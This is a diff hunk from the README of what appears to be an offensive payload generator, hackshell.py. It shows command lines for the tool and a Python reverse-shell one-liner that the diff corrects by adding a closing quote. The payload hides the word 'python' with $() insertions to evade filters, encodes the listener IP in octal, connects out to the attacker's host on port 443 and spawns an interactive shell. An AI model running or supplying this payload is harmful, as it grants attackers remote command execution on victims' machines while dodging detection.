@@ -130,7 +130,7 @@ py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,sock
 ```
 `python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type octa`  
 ```
-py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0300.0250.0000.0024",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0300.0250.0000.0024",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```  
 `python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type long`  
 
